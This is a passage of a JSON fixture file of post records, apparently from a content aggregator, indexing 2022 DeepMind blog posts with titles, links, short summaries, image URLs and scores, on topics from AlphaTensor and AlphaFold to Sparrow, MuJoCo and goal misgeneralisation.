(AI) and machine learning (ML), and we\u2019re proud to support the event as Diamond sponsors, helping foster the exchange of research advances in the AI and ML community. Teams from across DeepMind are presenting 47 papers, including 35 external collaborations in virtual panels and poster sessions.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/637f948db4166d0b667638c4_neurips_22.webp", "profile": 8, "updated_on": "2022-11-25T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11895.9987411, "slug": "deepminds-latest-research-at-neurips-2022-167", "topics": []}}, {"model": "app.post", "pk": 168, "fields": {"title": "Building interactive agents in video game worlds", "link": "https://www.deepmind.com/blog/building-interactive-agents-in-video-game-worlds", "source": 1, "normalized_link": "www.deepmind.com/blog/building-interactive-agents-in-video-game-worlds", "summary": "Most artificial intelligence (AI) researchers now believe that writing computer code which can capture the nuances of situated interactions is impossible. Alternatively, modern machine learning (ML) researchers have focused on learning about these types of interactions from data. To explore these learning-based approaches and quickly build agents that can make sense of human instructions and safely perform actions in open-ended conditions, we created a research framework within a video game environment.Today, we\u2019re publishing a paper [INSERT LINK] and collection of videos, showing our early steps in building video game AIs that can understand fuzzy human concepts \u2013 and therefore, can begin to interact with people on their own terms.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/637b9be64f76a74cf0c27bf3_Copy%20of%20interactive_agents_hd.png", "profile": 8, "updated_on": "2022-11-23T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11892.1587411, "slug": "building-interactive-agents-in-video-game-worlds-168", "topics": []}}, {"model": "app.post", "pk": 169, "fields": {"title": "Benchmarking the next generation of never-ending learners", "link": "https://www.deepmind.com/blog/benchmarking-the-next-generation-of-never-ending-learners", "source": 1, "normalized_link": "www.deepmind.com/blog/benchmarking-the-next-generation-of-never-ending-learners", "summary": "Our new paper, NEVIS\u201922: A Stream of 100 Tasks Sampled From 30 Years of Computer Vision Research, proposes a playground to study the question of efficient knowledge transfer in a controlled and reproducible setting. The Never-Ending Visual classification Stream (NEVIS\u201922) is a benchmark stream in addition to an evaluation protocol, a set of initial baselines, and an open-source codebase. This package provides an opportunity for researchers to explore how models can continually build on their knowledge to learn future tasks more efficiently.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62c2cd30ac8e869fd9b6b2af_icon--paper.svg", "profile": 8, "updated_on": "2022-11-22T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11890.2387411, "slug": "benchmarking-the-next-generation-of-never-ending-learners-169", "topics": []}}, {"model": "app.post", "pk": 170, "fields": {"title": "Best practices for data enrichment", "link": "https://www.deepmind.com/blog/best-practices-for-data-enrichment", "source": 1, "normalized_link": "www.deepmind.com/blog/best-practices-for-data-enrichment", "summary": "At DeepMind, our goal is to make sure everything we do meets the highest standards of safety and ethics, in line with our Operating Principles. One of the most important places this starts with is how we collect our data. In the past 12 months, we\u2019ve collaborated with Partnership on AI (PAI) to carefully consider these challenges, and have co-developed standardised best practices and processes for responsible human data collection.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6373d3c948249590e44147bc_16_9.png", "profile": 8, "updated_on": "2022-11-16T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11878.7187411, "slug": "best-practices-for-data-enrichment-170", "topics": []}}, {"model": "app.post", "pk": 171, "fields": {"title": "The pursuit of AI education - past, present, and future", "link": "https://www.deepmind.com/blog/the-pursuit-of-ai-education-past-present-and-future", "source": 1, "normalized_link": "www.deepmind.com/blog/the-pursuit-of-ai-education-past-present-and-future", "summary": "Meet Sylvia Christie, our education partnerships manager who\u2019s played a leading role in expanding our scholarship programme, which is marking its five-year anniversary.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/63654992b570aa12466d7deb_sylvia.webp", "profile": 8, "updated_on": "2022-11-08T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11863.3587411, "slug": "the-pursuit-of-ai-education-past-present-and-future-171", "topics": []}}, {"model": "app.post", "pk": 172, "fields": {"title": "Digital transformation with Google Cloud", "link": "https://www.deepmind.com/blog/digital-transformation-with-google-cloud", "source": 1, "normalized_link": "www.deepmind.com/blog/digital-transformation-with-google-cloud", "summary": "We\u2019ve partnered with Google Cloud over the last few years to apply our AI research for making a positive impact on core solutions used by their customers. Here, we introduce a few of these projects, including optimising document understanding, enhancing the value of wind energy, and offering easier use of AlphaFold.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/634fe232f87e0b7020f1c153_DM_GC_Hero.jpg", "profile": 8, "updated_on": "2022-10-20T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11826.8787411, "slug": "digital-transformation-with-google-cloud-172", "topics": []}}, {"model": "app.post", "pk": 173, "fields": {"title": "Measuring perception in AI models", "link": "https://www.deepmind.com/blog/measuring-perception-in-ai-models", "source": 1, "normalized_link": "www.deepmind.com/blog/measuring-perception-in-ai-models", "summary": "Perception \u2013 the process of experiencing the world through senses \u2013 is a significant part of intelligence. And building agents with human-level perceptual understanding of the world is a central but challenging task, which is becoming increasingly important in robotics, self-driving cars, personal assistants, medical imaging, and more. So today, we\u2019re introducing the Perception Test, a multimodal benchmark using real-world videos to help evaluate the perception capabilities of a model.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6345857c2bc3836a79fb84e9_Header%20(1).png", "profile": 8, "updated_on": "2022-10-12T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11811.5187411, "slug": "measuring-perception-in-ai-models-173", "topics": []}}, {"model": "app.post", "pk": 174, "fields": {"title": "How undesired goals can arise with correct rewards", "link": "https://www.deepmind.com/blog/how-undesired-goals-can-arise-with-correct-rewards", "source": 1, "normalized_link": "www.deepmind.com/blog/how-undesired-goals-can-arise-with-correct-rewards", "summary": "As we build increasingly advanced artificial intelligence (AI) systems, we want to make sure they don\u2019t pursue undesired goals. Such behaviour in an AI agent is often the result of specification gaming \u2013 exploiting a poor choice of what they are rewarded for. In our latest paper, we explore a more subtle mechanism by which AI systems may unintentionally learn to pursue undesired goals: goal misgeneralisation (GMG).\u00a0GMG occurs when a system's capabilities generalise successfully but its goal does not generalise as desired, so the system competently pursues the wrong goal. Crucially, in contrast to specification gaming, GMG can occur even when the AI system is trained with a correct specification.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2022-10-07T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11801.9187411, "slug": "how-undesired-goals-can-arise-with-correct-rewards-174", "topics": []}}, {"model": "app.post", "pk": 175, "fields": {"title": "Discovering novel algorithms with AlphaTensor", "link": "https://www.deepmind.com/blog/discovering-novel-algorithms-with-alphatensor", "source": 1, "normalized_link": "www.deepmind.com/blog/discovering-novel-algorithms-with-alphatensor", "summary": "In our paper, published today in Nature, we introduce AlphaTensor, the first artificial intelligence (AI) system for discovering novel, efficient, and provably correct algorithms for fundamental tasks such as matrix multiplication. This sheds light on a 50-year-old open question in mathematics about finding the fastest way to multiply two matrices. This paper is a stepping stone in DeepMind\u2019s mission to advance science and unlock the most fundamental problems using AI. Our system, AlphaTensor, builds upon AlphaZero, an agent that has shown superhuman performance on board games, like chess, Go and shogi, and this work shows the journey of AlphaZero from playing games to tackling unsolved mathematical problems for the first time.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/633c2e27fd141483d83afcb0_MM_Blogheader.png", "profile": 8, "updated_on": "2022-10-05T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11798.0787411, "slug": "discovering-novel-algorithms-with-alphatensor-175", "topics": []}}, {"model": "app.post", "pk": 176, "fields": {"title": "Supporting the next generation of AI leaders", "link": "https://www.deepmind.com/blog/supporting-the-next-generation-of-ai-leaders", "source": 1, "normalized_link": "www.deepmind.com/blog/supporting-the-next-generation-of-ai-leaders", "summary": "We\u2019re partnering with six education charities and social enterprises in the United Kingdom (UK) to co-create a bespoke education programme to help tackle the gaps in STEM education and boost existing programmes.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/632b36a158023307b04d9228_Header%20(1).jpg", "profile": 8, "updated_on": "2022-09-26T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11780.7987411, "slug": "supporting-the-next-generation-of-ai-leaders-176", "topics": []}}, {"model": "app.post", "pk": 177, "fields": {"title": "Building safer dialogue agents", "link": "https://www.deepmind.com/blog/building-safer-dialogue-agents", "source": 1, "normalized_link": "www.deepmind.com/blog/building-safer-dialogue-agents", "summary": "In our latest paper, we introduce Sparrow \u2013 a dialogue agent that\u2019s useful and reduces the risk of unsafe and inappropriate answers. Our agent is designed to talk with a user, answer questions, and search the internet using Google when it\u2019s helpful to look up evidence to inform its responses.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/632af3778318376fb573e4df_Sparrow_Header.jpg", "profile": 8, "updated_on": "2022-09-22T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11773.1187411, "slug": "building-safer-dialogue-agents-177", "topics": []}}, {"model": "app.post", "pk": 178, "fields": {"title": "How our principles helped define AlphaFold\u2019s release", "link": "https://www.deepmind.com/blog/how-our-principles-helped-define-alphafolds-release", "source": 1, "normalized_link": "www.deepmind.com/blog/how-our-principles-helped-define-alphafolds-release", "summary": "Our Operating Principles have come to define both our commitment to prioritising widespread benefit, as well as the areas of research and applications we refuse to pursue. These principles have been at the heart of our decision making since DeepMind was founded, and continue to be refined as the AI landscape changes and grows. They are designed for our role as a research-driven science company and consistent with Google\u2019s AI principles.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6321e9d11868c89a5a71b8c4_OP_Header.png", "profile": 8, "updated_on": "2022-09-14T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11757.7587411, "slug": "how-our-principles-helped-define-alphafolds-release-178", "topics": []}}, {"model": "app.post", "pk": 179, "fields": {"title": "Maximising the impact of our breakthroughs", "link": "https://www.deepmind.com/blog/maximising-the-impact-of-our-breakthroughs", "source": 1, "normalized_link": "www.deepmind.com/blog/maximising-the-impact-of-our-breakthroughs", "summary": "Colin, CBO at DeepMind, discusses collaborations with Alphabet and how we integrate ethics, accountability, and safety into everything we do.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/631f2c6af75c0648d3aef20a_Colin_Murdoch.jpg", "profile": 8, "updated_on": "2022-09-09T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11748.1587411, "slug": "maximising-the-impact-of-our-breakthroughs-179", "topics": []}}, {"model": "app.post", "pk": 180, "fields": {"title": "My journey from DeepMind intern to mentor", "link": "https://www.deepmind.com/blog/my-journey-from-deepmind-intern-to-mentor", "source": 1, "normalized_link": "www.deepmind.com/blog/my-journey-from-deepmind-intern-to-mentor", "summary": "Former intern turned intern manager, Richard Everett, describes his journey to DeepMind, sharing tips and advice for aspiring DeepMinders. The 2023 internship applications will open on the 16th September, please visit https://dpmd.ai/internshipsatdeepmind for more information.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2022-09-08T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11746.2387411, "slug": "my-journey-from-deepmind-intern-to-mentor-180", "topics": []}}, {"model": "app.post", "pk": 181, "fields": {"title": "In conversation with AI: building better language models", "link": "https://www.deepmind.com/blog/in-conversation-with-ai-building-better-language-models", "source": 1, "normalized_link": "www.deepmind.com/blog/in-conversation-with-ai-building-better-language-models", "summary": "Our new paper, In conversation with AI: aligning language models with human values, explores a different approach, asking what successful communication between humans and an artificial conversational agent might look like and what values should guide conversation in these contexts.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2022-09-06T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11742.3987411, "slug": "in-conversation-with-ai-building-better-language-models-181", "topics": []}}, {"model": "app.post", "pk": 182, "fields": {"title": "Advancing conservation with AI-based facial recognition of turtles", "link": "https://www.deepmind.com/blog/advancing-conservation-with-ai-based-facial-recognition-of-turtles", "source": 1, "normalized_link": "www.deepmind.com/blog/advancing-conservation-with-ai-based-facial-recognition-of-turtles", "summary": "We came across Zindi \u2013 a dedicated partner with complementary goals \u2013 who are the largest community of African data scientists and host competitions that focus on solving Africa\u2019s most pressing problems. Our Science team\u2019s Diversity, Equity, and Inclusion (DE&I) team worked with Zindi to identify a scientific challenge that could help advance conservation efforts and grow involvement in AI. Inspired by Zindi\u2019s bounding box turtle challenge, we landed on a project with the potential for real impact: turtle facial recognition.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6306106e19cc74840f40121a_Turtle%20Recall.webp", "profile": 8, "updated_on": "2022-08-25T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11719.3587411, "slug": "advancing-conservation-with-ai-based-facial-recognition-of-turtles-182", "topics": []}}, {"model": "app.post", "pk": 183, "fields": {"title": "Discovering when an agent is present in a system", "link": "https://www.deepmind.com/blog/discovering-when-an-agent-is-present-in-a-system", "source": 1, "normalized_link": "www.deepmind.com/blog/discovering-when-an-agent-is-present-in-a-system", "summary": "We want to build safe, aligned artificial general intelligence (AGI) systems that pursue the intended goals of its designers. Causal influence diagrams (CIDs) are a way to model decision-making situations that allow us to reason about agent incentives. By relating training setups to the incentives that shape agent behaviour, CIDs help illuminate potential risks before training an agent and can inspire better agent designs. But how do we know when a CID is an accurate model of a training setup?", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62fe48efd915cb0f1d44bd90_alg%202.png", "profile": 8, "updated_on": "2022-08-18T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11705.9187411, "slug": "discovering-when-an-agent-is-present-in-a-system-183", "topics": []}}, {"model": "app.post", "pk": 184, "fields": {"title": "Realising scientists are the real superheroes", "link": "https://www.deepmind.com/blog/realising-scientists-are-the-real-superheroes", "source": 1, "normalized_link": "www.deepmind.com/blog/realising-scientists-are-the-real-superheroes", "summary": "Meet Edgar Du\u00e9\u00f1ez-Guzm\u00e1n, a research engineer on our Multi-Agent Research team who\u2019s drawing on knowledge of game theory, computer science, and social evolution to get AI agents working better together.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2022-08-11T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11692.4787411, "slug": "realising-scientists-are-the-real-superheroes-184", "topics": []}}, {"model": "app.post", "pk": 185, "fields": {"title": "AlphaFold reveals the structure of the protein universe", "link": "https://www.deepmind.com/blog/alphafold-reveals-the-structure-of-the-protein-universe", "source": 1, "normalized_link": "www.deepmind.com/blog/alphafold-reveals-the-structure-of-the-protein-universe", "summary": "Today, in partnership with EMBL\u2019s European Bioinformatics Institute (EMBL-EBI), we\u2019re now releasing predicted structures for nearly all catalogued proteins known to science, which will expand the AlphaFold DB by over 200x - from nearly 1 million structures to over 200 million structures - with the potential to dramatically increase our understanding of biology.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62e1122b086bb045a5120c87_af200_blog.webp", "profile": 8, "updated_on": "2022-07-28T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11665.5987411, "slug": "alphafold-reveals-the-structure-of-the-protein-universe-185", "topics": []}}, {"model": "app.post", "pk": 186, "fields": {"title": "The virtuous cycle of AI research", "link": "https://www.deepmind.com/blog/the-virtuous-cycle-of-ai-research", "source": 1, "normalized_link": "www.deepmind.com/blog/the-virtuous-cycle-of-ai-research", "summary": "We recently caught up with Petar Veli\u010dkovi\u0107, a research scientist at DeepMind. Along with his co-authors, Petar is presenting his paper The CLRS Algorithmic Reasoning Benchmark at ICML 2022 in Baltimore, Maryland, USA.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/632c37d04c575b001a37c0f0_virtuous_cycle_of_AI_research.webp", "profile": 8, "updated_on": "2022-07-19T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11648.3187411, "slug": "the-virtuous-cycle-of-ai-research-186", "topics": []}}, {"model": "app.post", "pk": 187, "fields": {"title": "Perceiver AR: general-purpose, long-context autoregressive generation", "link": "https://www.deepmind.com/blog/perceiver-ar-general-purpose-long-context-autoregressive-generation", "source": 1, "normalized_link": "www.deepmind.com/blog/perceiver-ar-general-purpose-long-context-autoregressive-generation", "summary": "We develop Perceiver AR, an autoregressive, modality-agnostic architecture which uses cross-attention to map long-range inputs to a small number of latents while also maintaining end-to-end causal masking. Perceiver AR can directly attend to over a hundred thousand tokens, enabling practical long-context density estimation without the need for hand-crafted sparsity patterns or memory mechanisms.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2022-07-16T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11642.5587411, "slug": "perceiver-ar-general-purpose-long-context-autoregressive-generation-187", "topics": []}}, {"model": "app.post", "pk": 188, "fields": {"title": "DeepMind\u2019s latest research at ICML 2022", "link": "https://www.deepmind.com/blog/deepminds-latest-research-at-icml-2022", "source": 1, "normalized_link": "www.deepmind.com/blog/deepminds-latest-research-at-icml-2022", "summary": "Starting this weekend, the thirty-ninth International Conference on Machine Learning (ICML 2022) is meeting from 17-23 July, 2022 at the Baltimore Convention Center in Maryland, USA, and will be running as a hybrid event. Researchers working across artificial intelligence, data science, machine vision, computational biology, speech recognition, and more are presenting and publishing their cutting-edge work in machine learning.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62d15764d466f6f75019529c_AGI_05.jpg", "profile": 8, "updated_on": "2022-07-15T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11640.6387411, "slug": "deepminds-latest-research-at-icml-2022-188", "topics": []}}, {"model": "app.post", "pk": 189, "fields": {"title": "Working together with YouTube", "link": "https://www.deepmind.com/blog/working-together-with-youtube", "source": 1, "normalized_link": "www.deepmind.com/blog/working-together-with-youtube", "summary": "Applying our AI research to enhance the YouTube experience. Helping enrich people\u2019s lives with our research, we\u2019ve partnered with businesses across Alphabet to apply our technology towards improving the products and services used by billions of people every day.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62d023323559e56e2ed4e54d_YouTube_Blog__Header.png", "profile": 8, "updated_on": "2022-07-14T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11638.7187411, "slug": "working-together-with-youtube-189", "topics": []}}, {"model": "app.post", "pk": 190, "fields": {"title": "Intuitive physics learning in a deep-learning model inspired by developmental psychology", "link": "https://www.deepmind.com/blog/intuitive-physics-learning-in-a-deep-learning-model-inspired-by-developmental-psychology", "source": 1, "normalized_link": "www.deepmind.com/blog/intuitive-physics-learning-in-a-deep-learning-model-inspired-by-developmental-psychology", "summary": "Despite significant effort, current AI systems pale in their understanding of intuitive physics, in comparison to even very young children. In the present work, we address this AI problem, specifically by drawing on the field of developmental psychology.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2022-07-11T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11632.9587411, "slug": "intuitive-physics-learning-in-a-deep-learning-model-inspired-by-developmental-psychology-190", "topics": []}}, {"model": "app.post", "pk": 191, "fields": {"title": "Human-centred mechanism design with Democratic AI", "link": "https://www.deepmind.com/blog/human-centred-mechanism-design-with-democratic-ai", "source": 1, "normalized_link": "www.deepmind.com/blog/human-centred-mechanism-design-with-democratic-ai", "summary": "In our recent paper, published in Nature Human Behaviour, we provide a proof-of-concept demonstration that deep reinforcement learning (RL) can be used to find economic policies that people will vote for by majority in a simple game. The paper thus addresses a key challenge in AI research - how to train AI systems that align with human values.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62c2cd30ac8e869fd9b6b2af_icon--paper.svg", "profile": 8, "updated_on": "2022-07-04T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11619.5187411, "slug": "human-centred-mechanism-design-with-democratic-ai-191", "topics": []}}, {"model": "app.post", "pk": 192, "fields": {"title": "BYOL-Explore: Exploration with Bootstrapped Prediction", "link": "https://www.deepmind.com/blog/byol-explore-exploration-with-bootstrapped-prediction", "source": 1, "normalized_link": "www.deepmind.com/blog/byol-explore-exploration-with-bootstrapped-prediction", "summary": "We present BYOL-Explore, a conceptually simple yet general approach for curiosity-driven exploration in visually-complex environments. BYOL-Explore learns a world representation, the world dynamics, and an exploration policy all-together by optimizing a single prediction loss in the latent space with no additional auxiliary objective. We show that BYOL-Explore is effective in DM-HARD-8, a challenging partially-observable continuous-action hard-exploration benchmark with visually-rich 3-D environments.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62c2cd30ac8e869fd9b6b2af_icon--paper.svg", "profile": 8, "updated_on": "2022-06-20T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11592.6387411, "slug": "byol-explore-exploration-with-bootstrapped-prediction-192", "topics": []}}, {"model": "app.post", "pk": 193, "fields": {"title": "Unlocking High-Accuracy Differentially Private Image Classification through Scale", "link": "https://www.deepmind.com/blog/unlocking-high-accuracy-differentially-private-image-classification-through-scale", "source": 1, "normalized_link": "www.deepmind.com/blog/unlocking-high-accuracy-differentially-private-image-classification-through-scale", "summary": "According to empirical evidence from prior works, utility degradation in DP-SGD becomes more severe on larger neural network models \u2013 including the ones regularly used to achieve the best performance on challenging image classification benchmarks. Our work investigates this phenomenon and proposes a series of simple modifications to both the training procedure and model architecture, yielding a significant improvement on the accuracy of DP training on standard image classification benchmarks.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62c2cd30ac8e869fd9b6b2af_icon--paper.svg", "profile": 8, "updated_on": "2022-06-17T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11586.8787411, "slug": "unlocking-high-accuracy-differentially-private-image-classification-through-scale-193", "topics": []}}, {"model": "app.post", "pk": 194, "fields": {"title": "Bridging DeepMind research with Alphabet products", "link": "https://www.deepmind.com/blog/bridging-deepmind-research-with-alphabet-products", "source": 1, "normalized_link": "www.deepmind.com/blog/bridging-deepmind-research-with-alphabet-products", "summary": "Today we caught up with Gemma Jennings, a product manager on the Applied team, who led a session on vision language models at the AI Summit, one of the world\u2019s largest AI events for business.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62a9f619d9122bdc3231b4ed_Gemma_Jennings__Blog__16x9.jpg", "profile": 8, "updated_on": "2022-06-15T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11583.0387411, "slug": "bridging-deepmind-research-with-alphabet-products-194", "topics": []}}, {"model": "app.post", "pk": 195, "fields": {"title": "Advocating for the LGBTQ+ community in AI research", "link": "https://www.deepmind.com/blog/advocating-for-the-lgbtq-community-in-ai-research", "source": 1, "normalized_link": "www.deepmind.com/blog/advocating-for-the-lgbtq-community-in-ai-research", "summary": "Research scientist, Kevin McKee, tells how his early love of science fiction and social psychology inspired his career, and how he\u2019s helping advance research in \u2018queer fairness\u2019, support human-AI collaboration, and study the effects of AI on the LGBTQ+ community.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62974fe02b612c38d144ccea_Kevin_McKee__Blog_Header__16x9.jpg", "profile": 8, "updated_on": "2022-06-01T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11556.1587411, "slug": "advocating-for-the-lgbtq-community-in-ai-research-195", "topics": []}}, {"model": "app.post", "pk": 196, "fields": {"title": "Evaluating Multimodal Interactive Agents", "link": "https://www.deepmind.com/blog/evaluating-multimodal-interactive-agents", "source": 1, "normalized_link": "www.deepmind.com/blog/evaluating-multimodal-interactive-agents", "summary": "In this paper, we assess the merits of these existing evaluation metrics and present a novel approach to evaluation called the Standardised Test Suite (STS). The STS uses behavioural scenarios mined from real human interaction data.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2022-05-27T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11546.5587411, "slug": "evaluating-multimodal-interactive-agents-196", "topics": []}}, {"model": "app.post", "pk": 197, "fields": {"title": "Kyrgyzstan to King\u2019s Cross: the star baker cooking up code", "link": "https://www.deepmind.com/blog/kyrgyzstan-to-kings-cross-the-star-baker-cooking-up-code", "source": 1, "normalized_link": "www.deepmind.com/blog/kyrgyzstan-to-kings-cross-the-star-baker-cooking-up-code", "summary": "My day can vary, it really depends on which phase of the project I'm on. Let\u2019s say we want to add a feature to our product \u2013 my tasks could range from designing solutions and working with the team to find the best one, to deploying new features into production and doing maintenance. Along the way, I\u2019ll communicate changes to our stakeholders, write docs, code and test solutions, build analytics dashboards, clean-up old code, and fix bugs.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62d6c7857b5609ca712f2aaa_image%20(2).png", "profile": 8, "updated_on": "2022-05-26T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11544.6387411, "slug": "kyrgyzstan-to-kings-cross-the-star-baker-cooking-up-code-197", "topics": []}}, {"model": "app.post", "pk": 198, "fields": {"title": "Dynamic language understanding: adaptation to new knowledge in parametric and semi-parametric models", "link": "https://www.deepmind.com/blog/dynamic-language-understanding-adaptation-to-new-knowledge-in-parametric-and-semi-parametric-models", "source": 1, "normalized_link": "www.deepmind.com/blog/dynamic-language-understanding-adaptation-to-new-knowledge-in-parametric-and-semi-parametric-models", "summary": "To study how semi-parametric QA models and their underlying parametric language models (LMs) adapt to evolving knowledge, we construct a new large-scale dataset, StreamingQA, with human written and generated questions asked on a given date, to be answered from 14 years of time-stamped news articles. We evaluate our models quarterly as they read new articles not seen in pre-training. We show that parametric models can be updated without full retraining, while avoiding catastrophic forgetting.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2022-05-26T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11544.6387411, "slug": "dynamic-language-understanding-adaptation-to-new-knowledge-in-parametric-and-semi-parametric-models-198", "topics": []}}, {"model": "app.post", "pk": 199, "fields": {"title": "Building a culture of pioneering responsibly", "link": "https://www.deepmind.com/blog/building-a-culture-of-pioneering-responsibly", "source": 1, "normalized_link": "www.deepmind.com/blog/building-a-culture-of-pioneering-responsibly", "summary": "When I joined DeepMind as COO, I did so in large part because I could tell that the founders and team had the same focus on positive social impact. In fact, at DeepMind, we now champion a term that perfectly captures my own values and hopes for integrating technology into people\u2019s daily lives: pioneering responsibly. I believe pioneering responsibly should be a priority for anyone working in tech. But I also recognise that it\u2019s especially important when it comes to powerful, widespread technologies like artificial intelligence. AI is arguably the most impactful technology being developed today. It has the potential to benefit humanity in innumerable ways \u2013 from combating climate change to preventing and treating disease. But it\u2019s essential that we account for both its positive and negative downstream impacts.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/628bb10c9262d40040f15edb_Lila_Ibrahim__Blog__16x9-0.jpg", "profile": 8, "updated_on": "2022-05-24T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11540.7987411, "slug": "building-a-culture-of-pioneering-responsibly-199", "topics": []}}, {"model": "app.post", "pk": 200, "fields": {"title": "Open-sourcing MuJoCo", "link": "https://www.deepmind.com/blog/open-sourcing-mujoco", "source": 1, "normalized_link": "www.deepmind.com/blog/open-sourcing-mujoco", "summary": "In October 2021, we announced that we acquired the MuJoCo physics simulator, and made it freely available for everyone to support research everywhere. We also committed to developing and maintaining MuJoCo as a free, open-source, community-driven project with best-in-class capabilities. Today, we\u2019re thrilled to report that open sourcing is complete and the entire codebase is on GitHub!\u00a0Here, we explain why MuJoCo is a great platform for open-source collaboration and share a preview of our roadmap going forward.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2022-05-23T00:00:00Z", "upvotes_count": 1, 